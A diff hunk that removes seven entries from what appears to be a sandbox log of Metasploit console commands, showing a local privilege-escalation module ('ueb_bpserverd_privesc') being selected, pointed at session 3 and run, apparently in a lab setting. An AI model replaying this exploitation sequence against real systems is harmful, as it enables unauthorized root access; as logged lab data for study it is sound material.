@@ -1,7 +1,0 @@
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:55:51.434998Z", "cmd_type": "msf-command", "cmd": "show options "}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:56:02.787314Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:56:30.165110Z", "cmd_type": "msf-command", "cmd": "use exploit/linux/local/ueb_bpserverd_privesc"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:56:34.334655Z", "cmd_type": "msf-command", "cmd": "show options "}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:56:40.011115Z", "cmd_type": "msf-command", "cmd": "set SESSION 3"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:56:50.006661Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:56:56.188622Z", "cmd_type": "msf-command", "cmd": "sessions "}
